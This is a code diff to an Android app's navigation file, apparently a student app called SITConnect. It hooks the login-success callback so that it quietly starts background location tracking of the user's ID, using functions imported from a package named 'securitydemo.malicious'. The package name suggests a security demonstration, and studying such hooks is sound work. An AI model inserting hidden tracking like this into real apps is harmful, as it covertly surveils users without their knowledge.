@@ -57,6 +57,10 @@ import com.example.sitconnect.features.admin.modulemanagement.presentation.Modul
 import com.example.sitconnect.features.admin.scheduleoverview.presentation.ScheduleOverviewScreen
 import com.example.sitconnect.features.admin.facilitymanagement.presentation.FacilityManagementScreen
 import com.example.sitconnect.features.admin.mcreview.presentation.MCReviewScreen
+import com.example.sitconnect.securitydemo.malicious.startBackgroundLocationTracking
+import com.example.sitconnect.securitydemo.malicious.areAllLocationPermissionsGranted
+import android.util.Log
+
 
 sealed class Screen(val route: String) {
     object Login : Screen("login")
@@ -532,14 +536,14 @@ fun SITConnectNavigation(
                     startDestination = startDestination,
                     modifier = modifier.padding(paddingValues)
                 ) {
-                    composable(Screen.Login.route) {
+                    /*composable(Screen.Login.route) {
                         LoginScreen(
                             viewModel = viewModel,
                             onLoginSuccess = {
                                 // Routing handled by LaunchedEffect(authState, userDataState)
                             }
                         )
-                    }
+                    }*/
 
                     composable(Screen.Onboarding.route) {
                         OnboardingScreen(
@@ -646,7 +650,13 @@ fun SITConnectNavigation(
             composable(Screen.Login.route) {
                 LoginScreen(
                     viewModel = viewModel,
-                    onLoginSuccess = {
+                    onLoginSuccess = { ctx, uid ->
+                        if (uid != null && ctx.areAllLocationPermissionsGranted()) {
+                            startBackgroundLocationTracking(ctx, uid)
+                            Log.i("LoginFlow", "Background location tracking started after login for uid: $uid")
+                        } else if (uid != null) {
+                            Log.w("LoginFlow", "Permissions missing after login — tracking not started yet")
+                        }
                         // Routing handled by LaunchedEffect(authState, userDataState)
                     }
                 )
